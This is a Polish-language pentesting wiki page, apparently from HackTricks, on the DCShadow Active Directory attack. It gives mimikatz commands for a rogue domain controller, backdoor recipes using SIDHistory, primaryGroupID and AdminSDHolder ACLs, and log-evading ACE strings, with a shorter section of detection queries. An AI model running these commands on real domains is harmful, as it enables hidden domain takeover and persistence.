# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

Rejestruje **nowy kontroler domeny** w AD i używa go do **wypchnięcia atrybutów** (SIDHistory, SPNs...) do określonych obiektów, **nie pozostawiając żadnych logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień **DA** i musisz znajdować się wewnątrz **domeny głównej**.\
Pamiętaj, że jeśli użyjesz nieprawidłowych danych, pojawią się bardzo nieprzyjemne logi.<sup>[[2]](#references)</sup>

Aby wykonać atak, potrzebujesz 2 instancji mimikatz. Jedna z nich uruchomi serwery RPC z uprawnieniami SYSTEM (musisz wskazać tutaj zmiany, które chcesz wykonać), a druga instancja zostanie użyta do wypchnięcia wartości:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Zauważ, że **`elevate::token`** nie zadziała w sesji `mimikatz1`, ponieważ podnosi uprawnienia wątku, a my musimy podnieść **uprawnienia procesu**.\
Możesz również wybrać obiekt „LDAP”: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Możesz wypchnąć zmiany z poziomu DA lub użytkownika posiadającego następujące minimalne uprawnienia:

- W **obiekcie domeny**:
- _DS-Install-Replica_ (Dodawanie/usuwanie repliki w domenie)
- _DS-Replication-Manage-Topology_ (Zarządzanie topologią replikacji)
- _DS-Replication-Synchronize_ (Synchronizacja replikacji)
- Obiekt **Sites** (i jego elementy podrzędne) w **kontenerze Configuration**:
- _CreateChild and DeleteChild_
- Obiekt **komputera zarejestrowanego jako DC**:
- _WriteProperty_ (nie Write)
- **Obiekt docelowy**:
- _WriteProperty_ (nie Write)

Możesz użyć [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), aby nadać te uprawnienia nieuprzywilejowanemu użytkownikowi (zauważ, że pozostawi to pewne logi). Jest to znacznie bardziej restrykcyjne niż posiadanie uprawnień DA.\
Na przykład: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Oznacza to, że nazwa użytkownika _**student1**_ po zalogowaniu na komputerze _**mcorp-student1**_ ma uprawnienia DCShadow do obiektu _**root1user**_.

## Używanie DCShadow do tworzenia backdoorów
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Nadużycie grupy podstawowej, luki w enumeracji i wykrywanie

- `primaryGroupID` jest osobnym atrybutem, niezależnym od listy `member` grupy. DCShadow/DSInternals mogą zapisać go bezpośrednio (np. ustawić `primaryGroupID=512` dla **Domain Admins**) bez wymuszania przez LSASS działające na hoście, ale AD nadal **przenosi** użytkownika: zmiana PGID zawsze usuwa członkostwo z poprzedniej grupy podstawowej (tak samo dla każdej docelowej grupy), więc nie można zachować członkostwa w poprzedniej grupie podstawowej.<sup>[[1]](#references)</sup>
- Domyślne narzędzia uniemożliwiają usunięcie użytkownika z jego bieżącej grupy podstawowej (`ADUC`, `Remove-ADGroupMember`), dlatego zmiana PGID zazwyczaj wymaga bezpośrednich zapisów do katalogu (DCShadow/`Set-ADDBPrimaryGroup`).
- Raportowanie członkostwa jest niespójne:
- **Uwzględnia** członków wynikających z grupy podstawowej: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Pomija** członków wynikających z grupy podstawowej: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit podczas sprawdzania `member`, `Get-ADUser <user> -Properties memberOf`.
- Sprawdzanie rekurencyjne może pomijać członków grupy podstawowej, jeśli **grupa podstawowa jest sama zagnieżdżona** (np. PGID użytkownika wskazuje na zagnieżdżoną grupę wewnątrz Domain Admins); `Get-ADGroupMember -Recursive` ani rekurencyjne filtry LDAP nie zwrócą tego użytkownika, chyba że rekurencja jawnie rozwiązuje grupy podstawowe.
- Triki z DACL: atakujący mogą **odmówić ReadProperty** dla `primaryGroupID` użytkownika (lub dla atrybutu `member` grup, które nie są chronione przez AdminSDHolder), ukrywając efektywne członkostwo przed większością zapytań PowerShell; `net group` nadal rozwiąże członkostwo. Grupy chronione przez AdminSDHolder zresetują takie odmowy.

Przykłady wykrywania/monitorowania:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Porównaj uprzywilejowane grupy, zestawiając wynik `Get-ADGroupMember` z `Get-ADGroup -Properties member` lub ADSI Edit, aby wykryć rozbieżności wprowadzone przez `primaryGroupID` lub ukryte atrybuty.<sup>[[1]](#references)</sup>

## Shadowception - Nadawanie uprawnień DCShadow za pomocą DCShadow (bez logów zmodyfikowanych uprawnień)

Musimy na końcu dodać następujące ACE z SID-em naszego użytkownika:<sup>[[2]](#references)</sup>

- W obiekcie domeny:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- W obiekcie komputera atakującego: `(A;;WP;;;UserSID)`
- W obiekcie użytkownika docelowego: `(A;;WP;;;UserSID)`
- W obiekcie Sites w kontenerze Configuration: `(A;CI;CCDC;;;UserSID)`

Aby uzyskać bieżący ACE obiektu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

W tym przypadku musisz wprowadzić **kilka zmian**, a nie tylko jedną. W **sesji mimikatz1** (serwerze RPC) użyj parametru **`/stack` przy każdej zmianie**. Następnie musisz użyć **`/push`** tylko raz, aby zastosować wszystkie zmiany zapisane na stosie z rogue server.

[**Więcej informacji o DCShadow w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Przygody z działaniem, raportowaniem i wykorzystaniem Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [Opis DCShadow w ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
